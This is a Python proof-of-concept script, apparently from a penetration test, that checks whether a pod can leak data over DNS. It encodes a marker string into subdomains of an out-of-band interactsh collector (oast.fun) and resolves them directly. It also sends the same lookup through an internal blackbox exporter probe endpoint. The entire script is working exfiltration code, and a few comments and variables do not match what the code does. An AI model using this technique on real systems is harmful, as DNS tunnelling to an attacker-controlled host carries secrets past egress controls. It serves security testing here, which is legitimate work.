import base64, requests, socket

# Encode "Hello World" in base64
data = base64.b64encode(b"Hello World from Sp Studio").decode()
# = "SGVsbG8gV29ybGQ="
# Make DNS-safe (replace = with -, + with _)
dns_safe = data.replace("=", "").replace("+", "-").replace("/", "_")
print(f"Encoded: {dns_safe}")  

# PoC Option 1: Prove DNS query leaves the pod
exfil_domain = f"{dns_safe}.qojmwgiiuxroywwpclwszra75t1autusy.oast.fun"

# Try resolving it - this sends a DNS query OUT
try:
    ip = socket.gethostbyname(exfil_domain)
    print(f"DNS query sent for: {exfil_domain}")
    print(f"Resolved to: {ip}")
except socket.gaierror as e:
    print(f"DNS query attempted (may not resolve): {e}")
    print(f"But the query WAS sent to external DNS!")

# PoC Option 2: Use blackbox exporter to send DNS probe

print('Test using blackbox probe')
data = base64.b64encode(b"Hello World from Sp Blackbox").decode()
# = "SGVsbG8gV29ybGQ="
# Make DNS-safe (replace = with -, + with _)
dns_safe = data.replace("=", "").replace("+", "-").replace("/", "_")

print(f"Encoded: {dns_safe}")  
blackbox = "http://198.18.12.79:9115"
r = requests.get(
    f"{blackbox}/probe",
    params={
        "module": "dns",    # DNS module
        "target": exfil_domain,
        "debug": "true"
    },
    timeout=10
)
print(f"\nBlackbox DNS probe status: {r.status_code}")
print(r.text[:500])

# PoC Option 3: Use interactsh (free, no setup needed)
# https://app.interactsh.com gives you a domain like:
# abc123.oast.fun
# Any DNS query to *.abc123.oast.fun shows in their dashboard
interactsh_domain = f"{dns_safe}.YOURCODE.oast.fun"
try:
    socket.gethostbyname(interactsh_domain)
except:
    pass
print(f"\nCheck https://app.interactsh.com for query: {interactsh_domain}")
print("If it appears there = DNS exfiltration confirmed!")
